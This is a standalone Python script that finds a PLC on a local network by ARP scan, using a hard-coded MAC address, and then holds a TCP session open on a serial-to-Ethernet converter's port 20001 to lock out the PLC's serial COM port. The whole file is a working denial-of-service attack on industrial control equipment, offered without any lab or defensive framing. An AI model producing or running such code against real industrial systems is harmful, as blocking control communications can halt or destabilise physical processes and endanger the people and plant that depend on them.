import socket
import time
from scapy.all import ARP, Ether, srp

# Function to scan the network for the PLC's IP address
def find_plc_ip(target_mac):
    # Define the ARP request packet
    arp = ARP(pdst="10.0.0.0/24")  # Adjust the network range as needed
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response
    for sent, received in result:
        if received.hwsrc == target_mac:
            return received.psrc

    return None

# Function to block the serial COM port by holding open a TCP session
def block_serial_com(ip, port):
    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)

        # Connect to the serial-to-Ethernet converter
        s.connect((ip, port))
        print(f"Successfully blocked serial COM port on {ip}:{port}")

        # Keep the connection open indefinitely
        while True:
            time.sleep(1)

    except Exception as e:
        print(f"Failed to block serial COM port: {e}")
    finally:
        s.close()

# Main script
if __name__ == "__main__":
    # Replace with the MAC address of the PLC
    plc_mac = "00:1D:9C:C7:B0:30"  # Example MAC address, replace with the actual one

    # Find the PLC's IP address
    plc_ip = find_plc_ip(plc_mac)
    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")

        # Block the serial COM port (assuming port 20001 for COM1)
        block_serial_com(plc_ip, 20001)
    else:
        print("PLC not found on the network.")